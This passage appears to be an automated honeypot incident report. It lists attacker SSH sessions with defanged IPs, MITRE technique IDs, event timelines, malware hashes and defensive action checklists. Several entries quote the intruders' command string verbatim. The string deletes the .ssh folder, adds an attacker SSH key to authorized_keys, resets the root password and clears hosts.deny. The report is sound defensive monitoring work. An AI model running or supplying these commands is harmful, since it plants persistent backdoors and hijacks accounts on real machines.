| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:dD80wwks7b69"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:28:39` | `cowrie.session.connect` |
| `2026-05-20 13:28:39` | `cowrie.client.version` |
| `2026-05-20 13:28:39` | `cowrie.client.kex` |
| `2026-05-20 13:28:40` | `cowrie.login.success` |
| `2026-05-20 13:28:40` | `cowrie.session.params` |
| `2026-05-20 13:28:40` | `cowrie.command.input` |
| `2026-05-20 13:28:40` | `cowrie.command.failed` |
| `2026-05-20 13:28:41` | `cowrie.log.closed` |
| `2026-05-20 13:28:41` | `cowrie.session.params` |
| `2026-05-20 13:28:41` | `cowrie.command.input` |
| `2026-05-20 13:28:41` | `cowrie.session.file_download` |
| `2026-05-20 13:28:41` | `cowrie.log.closed` |
| `2026-05-20 13:29:10` | `cowrie.session.params` |
| `2026-05-20 13:29:10` | `cowrie.command.input` |
| `2026-05-20 13:29:10` | `cowrie.log.closed` |
| `2026-05-20 13:29:11` | `cowrie.session.params` |
| `2026-05-20 13:29:11` | `cowrie.command.input` |
| `2026-05-20 13:29:11` | `cowrie.log.closed` |
| `2026-05-20 13:29:11` | `cowrie.session.params` |
| `2026-05-20 13:29:11` | `cowrie.command.input` |
| `2026-05-20 13:29:11` | `cowrie.session.file_download` |
| `2026-05-20 13:29:11` | `cowrie.log.closed` |
| `2026-05-20 13:29:12` | `cowrie.session.params` |
| `2026-05-20 13:29:12` | `cowrie.command.input` |
| `2026-05-20 13:29:12` | `cowrie.log.closed` |
| `2026-05-20 13:29:12` | `cowrie.session.params` |
| `2026-05-20 13:29:12` | `cowrie.command.input` |
| `2026-05-20 13:29:12` | `cowrie.log.closed` |
| `2026-05-20 13:29:13` | `cowrie.session.params` |
| `2026-05-20 13:29:13` | `cowrie.command.input` |
| `2026-05-20 13:29:13` | `cowrie.command.input` |
| `2026-05-20 13:29:13` | `cowrie.log.closed` |
| `2026-05-20 13:29:13` | `cowrie.session.params` |
| `2026-05-20 13:29:13` | `cowrie.command.input` |
| `2026-05-20 13:29:13` | `cowrie.log.closed` |
| `2026-05-20 13:29:13` | `cowrie.session.params` |
| `2026-05-20 13:29:13` | `cowrie.command.input` |
| `2026-05-20 13:29:14` | `cowrie.log.closed` |
| `2026-05-20 13:29:14` | `cowrie.session.params` |
| `2026-05-20 13:29:14` | `cowrie.command.input` |
| `2026-05-20 13:29:14` | `cowrie.log.closed` |
| `2026-05-20 13:29:14` | `cowrie.session.params` |
| `2026-05-20 13:29:14` | `cowrie.command.input` |
| `2026-05-20 13:29:15` | `cowrie.log.closed` |
| `2026-05-20 13:29:15` | `cowrie.session.params` |
| `2026-05-20 13:29:15` | `cowrie.command.input` |
| `2026-05-20 13:29:15` | `cowrie.log.closed` |
| `2026-05-20 13:29:15` | `cowrie.session.params` |
| `2026-05-20 13:29:15` | `cowrie.command.input` |
| `2026-05-20 13:29:16` | `cowrie.log.closed` |
| `2026-05-20 13:29:16` | `cowrie.session.params` |
| `2026-05-20 13:29:16` | `cowrie.command.input` |
| `2026-05-20 13:29:16` | `cowrie.log.closed` |
| `2026-05-20 13:29:16` | `cowrie.session.params` |
| `2026-05-20 13:29:16` | `cowrie.command.input` |
| `2026-05-20 13:29:17` | `cowrie.log.closed` |
| `2026-05-20 13:29:17` | `cowrie.session.params` |
| `2026-05-20 13:29:17` | `cowrie.command.input` |
| `2026-05-20 13:29:17` | `cowrie.log.closed` |
| `2026-05-20 13:29:17` | `cowrie.session.params` |
| `2026-05-20 13:29:17` | `cowrie.command.input` |
| `2026-05-20 13:29:17` | `cowrie.log.closed` |
| `2026-05-20 13:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.115[.]213` to AbuseIPDB if not already reported
- [ ] Block `14.103.115[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe19ff784af2

| Field | Detail |
|---|---|
| **Source IP** | `101.126.89[.]164` |
| **First Seen** | 2026-05-20 13:29 |
| **Last Seen** | 2026-05-20 13:34 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:36LVSzKAZQq3"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:29:04` | `cowrie.session.connect` |
| `2026-05-20 13:29:04` | `cowrie.client.version` |
| `2026-05-20 13:29:04` | `cowrie.client.kex` |
| `2026-05-20 13:29:05` | `cowrie.login.success` |
| `2026-05-20 13:29:06` | `cowrie.session.params` |
| `2026-05-20 13:29:06` | `cowrie.command.input` |
| `2026-05-20 13:29:06` | `cowrie.command.failed` |
| `2026-05-20 13:29:07` | `cowrie.log.closed` |
| `2026-05-20 13:29:07` | `cowrie.session.params` |
| `2026-05-20 13:29:07` | `cowrie.command.input` |
| `2026-05-20 13:29:07` | `cowrie.session.file_download` |
| `2026-05-20 13:29:07` | `cowrie.log.closed` |
| `2026-05-20 13:29:24` | `cowrie.session.params` |
| `2026-05-20 13:29:24` | `cowrie.command.input` |
| `2026-05-20 13:29:24` | `cowrie.log.closed` |
| `2026-05-20 13:29:24` | `cowrie.session.params` |
| `2026-05-20 13:29:24` | `cowrie.command.input` |
| `2026-05-20 13:34:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.89[.]164` to AbuseIPDB if not already reported
- [ ] Block `101.126.89[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d86536e55615

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:29 |
| **Last Seen** | 2026-05-20 13:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:29:23` | `cowrie.session.connect` |
| `2026-05-20 13:29:23` | `cowrie.client.version` |
| `2026-05-20 13:29:23` | `cowrie.client.kex` |
| `2026-05-20 13:29:24` | `cowrie.login.success` |
| `2026-05-20 13:29:25` | `cowrie.session.params` |
| `2026-05-20 13:29:25` | `cowrie.command.input` |
| `2026-05-20 13:29:25` | `cowrie.command.failed` |
| `2026-05-20 13:29:25` | `cowrie.log.closed` |
| `2026-05-20 13:29:25` | `cowrie.session.params` |
| `2026-05-20 13:29:25` | `cowrie.command.input` |
| `2026-05-20 13:29:26` | `cowrie.session.file_download` |
| `2026-05-20 13:29:26` | `cowrie.log.closed` |
| `2026-05-20 13:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e705abcee9c1

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:29 |
| **Last Seen** | 2026-05-20 13:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:29:28` | `cowrie.session.connect` |
| `2026-05-20 13:29:28` | `cowrie.client.version` |
| `2026-05-20 13:29:28` | `cowrie.client.kex` |
| `2026-05-20 13:29:29` | `cowrie.login.success` |
| `2026-05-20 13:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c5629a71f2

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:30 |
| **Last Seen** | 2026-05-20 13:30 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:30:50` | `cowrie.session.connect` |
| `2026-05-20 13:30:50` | `cowrie.client.version` |
| `2026-05-20 13:30:50` | `cowrie.client.kex` |
| `2026-05-20 13:30:51` | `cowrie.login.success` |
| `2026-05-20 13:30:52` | `cowrie.session.params` |
| `2026-05-20 13:30:52` | `cowrie.command.input` |
| `2026-05-20 13:30:52` | `cowrie.command.failed` |
| `2026-05-20 13:30:52` | `cowrie.log.closed` |
| `2026-05-20 13:30:53` | `cowrie.session.params` |
| `2026-05-20 13:30:53` | `cowrie.command.input` |
| `2026-05-20 13:30:53` | `cowrie.session.file_download` |
| `2026-05-20 13:30:53` | `cowrie.log.closed` |
| `2026-05-20 13:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c0ce259fd06

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:30 |
| **Last Seen** | 2026-05-20 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:30:56` | `cowrie.session.connect` |
| `2026-05-20 13:30:56` | `cowrie.client.version` |
| `2026-05-20 13:30:56` | `cowrie.client.kex` |
| `2026-05-20 13:30:57` | `cowrie.login.success` |
| `2026-05-20 13:30:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6038cacac1b3

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:32 |
| **Last Seen** | 2026-05-20 13:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:32:15` | `cowrie.session.connect` |
| `2026-05-20 13:32:15` | `cowrie.client.version` |
| `2026-05-20 13:32:15` | `cowrie.client.kex` |
| `2026-05-20 13:32:16` | `cowrie.login.success` |
| `2026-05-20 13:32:16` | `cowrie.session.params` |
| `2026-05-20 13:32:16` | `cowrie.command.input` |
| `2026-05-20 13:32:16` | `cowrie.command.failed` |
| `2026-05-20 13:32:16` | `cowrie.log.closed` |
| `2026-05-20 13:32:17` | `cowrie.session.params` |
| `2026-05-20 13:32:17` | `cowrie.command.input` |
| `2026-05-20 13:32:17` | `cowrie.session.file_download` |
| `2026-05-20 13:32:17` | `cowrie.log.closed` |
| `2026-05-20 13:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d223f44d060

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:32 |
| **Last Seen** | 2026-05-20 13:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:32:20` | `cowrie.session.connect` |
| `2026-05-20 13:32:20` | `cowrie.client.version` |
| `2026-05-20 13:32:20` | `cowrie.client.kex` |
| `2026-05-20 13:32:21` | `cowrie.login.success` |
| `2026-05-20 13:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86a0179362c0

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:33 |
| **Last Seen** | 2026-05-20 13:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:33:47` | `cowrie.session.connect` |
| `2026-05-20 13:33:47` | `cowrie.client.version` |
| `2026-05-20 13:33:47` | `cowrie.client.kex` |
| `2026-05-20 13:33:48` | `cowrie.login.success` |
| `2026-05-20 13:33:49` | `cowrie.session.params` |
| `2026-05-20 13:33:49` | `cowrie.command.input` |
| `2026-05-20 13:33:49` | `cowrie.command.failed` |
| `2026-05-20 13:33:49` | `cowrie.log.closed` |
| `2026-05-20 13:33:49` | `cowrie.session.params` |
| `2026-05-20 13:33:49` | `cowrie.command.input` |
| `2026-05-20 13:33:49` | `cowrie.session.file_download` |
| `2026-05-20 13:33:49` | `cowrie.log.closed` |
| `2026-05-20 13:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c88d26be2d

| Field | Detail |
|---|---|
| **Source IP** | `20.116.34[.]103` |
| **First Seen** | 2026-05-20 13:33 |
| **Last Seen** | 2026-05-20 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 13:33:52` | `cowrie.session.connect` |
| `2026-05-20 13:33:52` | `cowrie.client.version` |
| `2026-05-20 13:33:52` | `cowrie.client.kex` |
| `2026-05-20 13:33:53` | `cowrie.login.success` |
| `2026-05-20 13:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.116.34[.]103` to AbuseIPDB if not already reported
- [ ] Block `20.116.34[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86b68a098154

| Field | Detail |
|---|---|
| **Source IP** | `165.154.245[.]169` |
| **First Seen** | 2026-05-20 15:23 |
| **Last Seen** | 2026-05-20 15:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 15:23:23` | `cowrie.session.connect` |
| `2026-05-20 15:23:23` | `cowrie.client.version` |
| `2026-05-20 15:23:23` | `cowrie.client.kex` |
| `2026-05-20 15:23:24` | `cowrie.login.success` |
| `2026-05-20 15:23:24` | `cowrie.session.params` |
| `2026-05-20 15:23:24` | `cowrie.command.input` |
| `2026-05-20 15:23:24` | `cowrie.command.failed` |
| `2026-05-20 15:23:24` | `cowrie.log.closed` |
| `2026-05-20 15:23:24` | `cowrie.session.params` |
| `2026-05-20 15:23:24` | `cowrie.command.input` |
| `2026-05-20 15:23:24` | `cowrie.session.file_download` |
| `2026-05-20 15:23:24` | `cowrie.log.closed` |
| `2026-05-20 15:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.245[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.245[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94c9a6de55f5

| Field | Detail |
|---|---|
| **Source IP** | `165.154.245[.]169` |
| **First Seen** | 2026-05-20 15:23 |
| **Last Seen** | 2026-05-20 15:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 15:23:26` | `cowrie.session.connect` |
| `2026-05-20 15:23:26` | `cowrie.client.version` |
| `2026-05-20 15:23:26` | `cowrie.client.kex` |
| `2026-05-20 15:23:27` | `cowrie.login.success` |
| `2026-05-20 15:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.245[.]169` to AbuseIPDB if not already reported
- [ ] Block `165.154.245[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `157.245.56[.]194` | **1125** | 2026-05-20 10:54 | 2026-05-20 15:29 | 733m | 0 | `T1592` | 🟠 MEDIUM |
| `142.171.12[.]201` | **43** | 2026-05-20 11:10 | 2026-05-20 12:05 | 25m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **31** | 2026-05-20 11:05 | 2026-05-20 15:28 | 31m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.35[.]135` | **20** | 2026-05-20 12:29 | 2026-05-20 12:33 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `20.116.34[.]103` | **7** | 2026-05-20 13:21 | 2026-05-20 13:33 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.245[.]169` | **5** | 2026-05-20 15:16 | 2026-05-20 15:23 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `80.15.177[.]203` | **4** | 2026-05-20 15:20 | 2026-05-20 15:21 | 1m | 0 | `T1592` | 🟢 LOW |
| `101.126.89[.]164` | **2** | 2026-05-20 13:29 | 2026-05-20 13:31 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]213` | **2** | 2026-05-20 13:28 | 2026-05-20 13:30 | 4m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-05-20 12:39 | 2026-05-20 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.193[.]204` | **2** | 2026-05-20 13:14 | 2026-05-20 13:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]19` | 1 | 2026-05-20 13:23 | 2026-05-20 13:23 | 5s | 0 | `T1592` | 🟢 LOW |
| `118.186.7[.]9` | 1 | 2026-05-20 13:19 | 2026-05-20 13:19 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.111.240[.]172` | 1 | 2026-05-20 11:44 | 2026-05-20 11:44 | 13s | 0 | `T1592` | 🟢 LOW |
| `14.103.90[.]30` | 1 | 2026-05-20 13:20 | 2026-05-20 13:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.246.223[.]216` | 1 | 2026-05-20 15:18 | 2026-05-20 15:19 | 12s | 0 | `T1592` | 🟢 LOW |
| `194.48.248[.]43` | 1 | 2026-05-20 12:12 | 2026-05-20 12:12 | 4s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]224` | 1 | 2026-05-20 11:58 | 2026-05-20 11:58 | 3s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]227` | 1 | 2026-05-20 11:57 | 2026-05-20 11:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]3` | 1 | 2026-05-20 11:57 | 2026-05-20 11:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]4` | 1 | 2026-05-20 11:58 | 2026-05-20 11:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `54.227.126[.]11` | 1 | 2026-05-20 12:57 | 2026-05-20 12:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `70.120.203[.]193` | 1 | 2026-05-20 11:39 | 2026-05-20 11:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `89.139.25[.]92` | 1 | 2026-05-20 15:26 | 2026-05-20 15:26 | 13s | 0 | `T1592` | 🟢 LOW |

---

